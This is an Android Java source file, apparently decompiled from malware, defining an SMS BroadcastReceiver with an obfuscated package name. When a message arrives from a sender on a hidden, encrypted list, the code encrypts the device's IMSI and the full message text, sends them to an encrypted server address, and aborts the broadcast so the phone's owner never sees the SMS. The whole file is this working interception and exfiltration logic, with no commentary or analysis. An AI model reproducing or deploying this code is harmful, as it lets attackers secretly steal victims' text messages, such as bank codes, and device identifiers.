package com.dsifakf.aoakmnq;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

public class Receiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Object[] messages = (Object[]) intent.getExtras().get("pdus");
            SmsMessage[] smsMessage = new SmsMessage[messages.length];
            for (int n = 0; n < messages.length; n++) {
                smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
            }
            SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
            Secure parse = new Secure();
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            String blk = null;
            try {
                blk = new String(parse.decrypt(preferences.getString("cd", "a83f0eb1ecb50338585d5f561c3f632d")));
            } catch (Exception e) {
            }
            if (blk.toLowerCase().contains(smsMessage[0].getOriginatingAddress().toLowerCase())) {
                String fullMsgBody = "";
                for (SmsMessage messageBody : smsMessage) {
                    fullMsgBody = new StringBuilder(String.valueOf(fullMsgBody)).append(messageBody.getMessageBody()).toString();
                }
                String msgBody = null;
                String addr = null;
                String devimsi = null;
                try {
                    devimsi = Secure.bytesToHex(parse.encrypt(telephonyManager.getSubscriberId()));
                    msgBody = Secure.bytesToHex(parse.encrypt(Uri.encode("<i>" + smsMessage[0].getOriginatingAddress() + "<|>" + fullMsgBody + "</i>")));
                    addr = new String(parse.decrypt(preferences.getString("ab", "6e8fa676e42c9bceb6624fb7601a67d0cc0eceeb0218283614342ac69ade50775488a2f64e4d5f5dd2fc5f602c921176")));
                } catch (Exception e2) {
                }
                Connect2.CheckMultiThSupp(new Connect1(new StringBuilder(String.valueOf(addr)).append("?1=").append(devimsi).append("&2=").append(msgBody).toString()));
                abortBroadcast();
            }
        }
    }
}
